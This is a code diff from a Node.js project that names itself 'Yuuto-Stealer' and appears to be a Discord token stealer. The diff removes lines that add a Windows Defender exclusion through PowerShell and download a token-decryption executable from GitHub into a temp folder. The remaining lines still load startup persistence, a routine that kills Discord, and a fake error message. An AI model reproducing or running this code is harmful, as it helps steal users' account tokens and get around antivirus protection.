@@ -2,15 +2,12 @@ const config = require('../config');
 const { runningFromExecutable, sleep, runningFromStartup } = require('./general');
 const { join, sep } = require('path');
 const os = require('os');
-const { execSync, spawnSync } = require('child_process');
-const { copyFileSync, existsSync, mkdtempSync, createWriteStream } = require('fs');
-const axios = require('axios');
+const { copyFileSync, existsSync, mkdtempSync } = require('fs');
 
 let tempFolder = '';
 
 function createTempFolder() {
   tempFolder = mkdtempSync(join(os.tmpdir(), sep), 'utf8');
-  !runningFromExecutable() && spawnSync('explorer', [tempFolder]);
 
   return tempFolder;
 }
@@ -22,10 +19,6 @@ const getTempFolder = function() {
 module.exports = async () => {
   module.exports.getTempFolder = getTempFolder;
   const tempFolder = createTempFolder();
-
-  if (runningFromExecutable()) await execSync(`powershell -Command Add-MpPreference -ExclusionPath "${tempFolder}"`);
-  await download('https://github.com/JustYuuto/Yuuto-Stealer/raw/master/util/decrypt-token/decrypt_token.exe');
-  await sleep(500);
 
   if (config.addToStartup && runningFromExecutable()) require('../functions/startup');
   if (config.discord.killProcess) require('../functions/kill-discord');
@@ -50,14 +43,3 @@ module.exports = async () => {
 
   if (config.fakeError && !runningFromStartup()) require('../functions/fake-error');
 };
-
-function download(url) {
-  return new Promise(async (resolve) => {
-    try {
-      const { data } = await axios.get(url, { responseType: 'stream' });
-      data.pipe(createWriteStream(join(getTempFolder(), url.split('/').pop()))).on('finish', resolve);
-    } catch (e) {
-      process.exit(0);
-    }
-  });
-}
